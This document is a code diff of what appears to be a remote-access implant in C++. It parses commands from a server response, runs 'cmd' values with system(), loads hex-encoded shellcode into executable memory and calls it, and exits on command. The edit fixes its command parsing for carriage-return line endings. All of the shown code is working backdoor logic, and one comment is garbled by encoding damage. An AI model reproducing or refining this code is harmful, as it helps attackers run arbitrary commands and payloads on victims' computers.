@@ -87,10 +87,10 @@ private:
 public:
     Configure(string response)
     {
-        istringstream is(response);
-        string line;
+        istringstream is(response);	
+        string line;	
 
-        while (is >> line)
+        while (getline(is, line, '\n'))
         {
            
             int line_len = line.length();
@@ -117,11 +117,11 @@ public:
     VOID Selector()
     {
 
-        if (this->type == "cmd")
+        if (this->type == "cmd\r")
         {
             system((this->value).c_str());
         }
-        else if (this->type == "up")
+        else if (this->type == "up\r")
         {
             //shellcode_run(this->value);
             try {
@@ -133,7 +133,7 @@ public:
             {
             };
         }
-        else if (this->type == "exit")
+        else if (this->type == "exit\r")
         {
             exit(0);
         }
@@ -170,7 +170,7 @@ DWORD WINAPI shellcode_run(LPVOID lpParameter)
     memcpy(shellcode, shellcode_str.c_str(), len / 2 + 1);
     LPVOID Memory = VirtualAlloc(NULL, len / 2 + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(Memory, shellcode, len / 2 + 1);
-    //ÔËÐÐ
+    //ï¿½ï¿½ï¿½ï¿½
     ((void(*)())Memory)();
     return 0;
 }
